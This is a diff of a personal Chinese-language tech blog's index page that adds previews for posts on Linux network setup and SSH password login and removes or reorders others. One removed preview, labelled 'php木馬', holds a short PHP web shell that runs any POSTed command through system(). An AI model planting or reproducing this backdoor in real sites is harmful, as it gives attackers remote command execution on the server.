@@ -225,7 +225,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">37</div>
+    <div class="sidebar-state-number">40</div>
   </div>
   <div class="sidebar-state-category">
     <div>分類</div>
@@ -304,10 +304,133 @@
       <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/06/04/openvpn/" aria-label="openvpn"></a>
+      <a class="post-link" href="/2025/06/06/linux%E7%B6%B2%E8%B7%AF%E9%85%8D%E7%BD%AE/" aria-label="linux網路配置"></a>
     
     
     <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/images/600211.webp" data-sizes="auto" alt="linux網路配置" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-06</span>
+        <span><span class="icon-pencil"></span>121 字</span>
+        <span><span class="icon-clock"></span>1 分鐘</span>
+      </div>
+      <h2 class="post-title">linux網路配置</h2>
+      <article class="post-article">
+        
+          安裝網路 寬頻撥號
+sudo apt install pppoeconf
+sudo pppoeconf
+apt install net-tools
+
+nginx安裝cert
+sudo apt install certbot python3-certbot-nginx
+sudo certbot --nginx -d grandfantasia.ddns.net
+sudo certbot renew --dry-run
+sudo crontab -e
+0 0,12 * * * certbot renew --quiet
+sudo crontab -l
+
+Apache2 安裝cert
+sudo ap
+        
+      </article>
+    </div>
+  </div>
+</div>
+      
+    
+      <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/05/ssh%E6%94%B9%E6%88%90%E5%AF%86%E7%A2%BC%E7%99%BB%E5%85%A5/" aria-label="ssh改成密碼登入"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/images/600211.webp" data-sizes="auto" alt="ssh改成密碼登入" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-05</span>
+        <span><span class="icon-pencil"></span>34 字</span>
+        <span><span class="icon-clock"></span>1 分鐘</span>
+      </div>
+      <h2 class="post-title">ssh改成密碼登入</h2>
+      <article class="post-article">
+        
+          改密碼可登入ssh
+ls /etc/ssh/sshd_config.d/
+sudo nano /etc/ssh/sshd_config.d/*
+改成yes
+
+失敗
+sudo nano /etc/ssh/sshd_config
+
+重啟
+sudo systemctl restart sshd
+
+
+        
+      </article>
+    </div>
+  </div>
+</div>
+      
+    
+      <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/04/python%E6%8A%80%E8%A1%93%E5%82%B5%E8%8D%89/" aria-label="python技術債草"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/images/600211.webp" data-sizes="auto" alt="python技術債草" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-04</span>
+        <span><span class="icon-pencil"></span>69 字</span>
+        <span><span class="icon-clock"></span>1 分鐘</span>
+      </div>
+      <h2 class="post-title">python技術債草</h2>
+      <article class="post-article">
+        
+          曾經的我  用python寫了很多代碼
+自從我用了C++後  發現python真TM狗屎
+打包難打包成exe就算了 會整台電腦一起打包 此時當你有安裝大型項目
+例如TensorFlow, PyTorch 會涼涼
+也無法真正並行
+
+        
+      </article>
+    </div>
+  </div>
+</div>
+      
+    
+      <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/04/openvpn/" aria-label="openvpn"></a>
+    
+    
+    <div class="post-cover-right">
       
         
         
@@ -335,12 +458,12 @@ sudo openvpn –config academy-regular.ovpn &amp;amp;
       
     
       <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
+  <div class="post-wrap-left" data-aos="fade-up">
     
       <a class="post-link" href="/2025/06/03/TCP%20%E7%A1%AC%E5%9F%BA%E7%A4%8E/" aria-label="TCP 硬基礎"></a>
     
     
-    <div class="post-cover-right">
+    <div class="post-cover-left">
       
         
         
@@ -386,12 +509,12 @@ Server says: OK, I’m ready too, and I rece
       
     
       <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
+  <div class="post-wrap-right" data-aos="fade-up">
     
       <a class="post-link" href="/2025/06/03/Termshark%20Wireshark/" aria-label="Termshark &amp; Wireshark"></a>
     
     
-    <div class="post-cover-left">
+    <div class="post-cover-right">
       
         
         
@@ -431,12 +554,12 @@ tcp.stream eq 7
       
     
       <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
+  <div class="post-wrap-left" data-aos="fade-up">
     
       <a class="post-link" href="/2025/06/03/tshark/" aria-label="tshark"></a>
     
     
-    <div class="post-cover-right">
+    <div class="post-cover-left">
       
         
         
@@ -474,44 +597,6 @@ tshark -i eth0 -w /tmp/test.pcap
 
 Selecting an Interface &amp;amp; Applying Filters
 t
-        
-      </article>
-    </div>
-  </div>
-</div>
-      
-    
-      <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/06/02/Discord/" aria-label="Discord基礎"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        
-        
-          <img data-src="/images/600211.webp" data-sizes="auto" alt="Discord基礎" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-06-02</span>
-        <span><span class="icon-pencil"></span>44 字</span>
-        <span><span class="icon-clock"></span>1 分鐘</span>
-      </div>
-      <h2 class="post-title">Discord基礎</h2>
-      <article class="post-article">
-        
-          下載
-git clone https://github.com/discord/discord-example-app.git
-
-cd 然後將
-.&amp;#x2F;env sample 改成.&amp;#x2F;env填好參數
-邀請
-https://discord.com/oauth2/authorize?client_id=1379075368144867338&amp;amp;permissions=2147483648&amp;amp;scope=bot%20applications.commands
-
         
       </article>
     </div>
@@ -587,10 +672,48 @@ HTTP Basic 認證（use
       <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/06/02/OSCP-Exam-Report/" aria-label="OSCP-Exam-Report"></a>
+      <a class="post-link" href="/2025/06/02/Discord/" aria-label="Discord基礎"></a>
     
     
     <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/images/600211.webp" data-sizes="auto" alt="Discord基礎" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-02</span>
+        <span><span class="icon-pencil"></span>44 字</span>
+        <span><span class="icon-clock"></span>1 分鐘</span>
+      </div>
+      <h2 class="post-title">Discord基礎</h2>
+      <article class="post-article">
+        
+          下載
+git clone https://github.com/discord/discord-example-app.git
+
+cd 然後將
+.&amp;#x2F;env sample 改成.&amp;#x2F;env填好參數
+邀請
+https://discord.com/oauth2/authorize?client_id=1379075368144867338&amp;amp;permissions=2147483648&amp;amp;scope=bot%20applications.commands
+
+        
+      </article>
+    </div>
+  </div>
+</div>
+      
+    
+      <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/02/OSCP-Exam-Report/" aria-label="OSCP-Exam-Report"></a>
+    
+    
+    <div class="post-cover-right">
       
         
         
@@ -619,137 +742,6 @@ sudo apt install texlive-full
 
 download
 git clone https://github.com/noraj/OSCP-Exam-Repor
-        
-      </article>
-    </div>
-  </div>
-</div>
-      
-    
-      <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/06/02/PHP%E5%9F%BA%E7%A4%8E/" aria-label="PHP基礎"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        
-        
-          <img data-src="/images/600211.webp" data-sizes="auto" alt="PHP基礎" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-06-02</span>
-        <span><span class="icon-pencil"></span>233 字</span>
-        <span><span class="icon-clock"></span>1 分鐘</span>
-      </div>
-      <h2 class="post-title">PHP基礎</h2>
-      <article class="post-article">
-        
-          php木馬 (windows)
-&amp;lt;?php
-if ($_SERVER[&amp;#39;REQUEST_METHOD&amp;#39;] === &amp;#39;POST&amp;#39; &amp;amp;&amp;amp; isset($_POST[&amp;#39;cmd&amp;#39;])) &amp;#123;
-    $cmd = $_POST[&amp;#39;cmd&amp;#39;];
-    echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;;
-    system($cmd);
-    echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;;
-&amp;#125;
-?&amp;gt;
-
-&amp;lt;form method=&amp;quot;post&amp;quot;&amp;g
-        
-      </article>
-    </div>
-  </div>
-</div>
-      
-    
-      <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/06/02/mysql%E5%9F%BA%E7%A4%8E/" aria-label="mysql基礎"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        
-        
-          <img data-src="/images/600211.webp" data-sizes="auto" alt="mysql基礎" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-06-02</span>
-        <span><span class="icon-pencil"></span>395 字</span>
-        <span><span class="icon-clock"></span>2 分鐘</span>
-      </div>
-      <h2 class="post-title">mysql基礎</h2>
-      <article class="post-article">
-        
-          進入
-mysql -u root -p
-
-PHP連接mysql
-$conn = new mysqli(&amp;quot;localhost&amp;quot;, &amp;quot;user&amp;quot;, &amp;quot;pass&amp;quot;);
-
-
-$sql = &amp;quot;CREATE DATABASE database1&amp;quot;;
-$conn-&amp;gt;query($sql)
-
-$conn = new mysqli(&amp;quot;localhost&amp;quot;, &amp;quot;user&amp;quot;, &amp;quot;pass&amp;quot;, &amp;quot;database1&amp;quot;);
-$query = &amp;quot;s
-        
-      </article>
-    </div>
-  </div>
-</div>
-      
-    
-      <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/06/02/GO%E5%9F%BA%E7%A4%8E/" aria-label="GO基礎"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        
-        
-          <img data-src="/images/600211.webp" data-sizes="auto" alt="GO基礎" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-06-02</span>
-        <span><span class="icon-pencil"></span>56 字</span>
-        <span><span class="icon-clock"></span>1 分鐘</span>
-      </div>
-      <h2 class="post-title">GO基礎</h2>
-      <article class="post-article">
-        
-          到這邊安裝 [官網] (https://go.dev/dl/)
-查看版本  
-go version
-
-測試安裝是否成功
-package main
-
-import &amp;quot;fmt&amp;quot;
-
-func main() &amp;#123;
-    fmt.Println(&amp;quot;Hello, Go!&amp;quot;)
-&amp;#125;
-
-測試
-go run main.go
-
-編譯    go build main.go    .&amp;#x2F;main.exe
-
         
       </article>
     </div>
@@ -793,10 +785,10 @@ go run main.go
     
       <div>
         <span class="icon-brush"></span>
-        12.1k
+        13k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        01:13
+        01:18
       </div>
     
     
@@ -832,7 +824,7 @@ go run main.go
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">37</div>
+    <div class="sidebar-state-number">40</div>
   </div>
   <div class="sidebar-state-category">
     <div>分類</div>
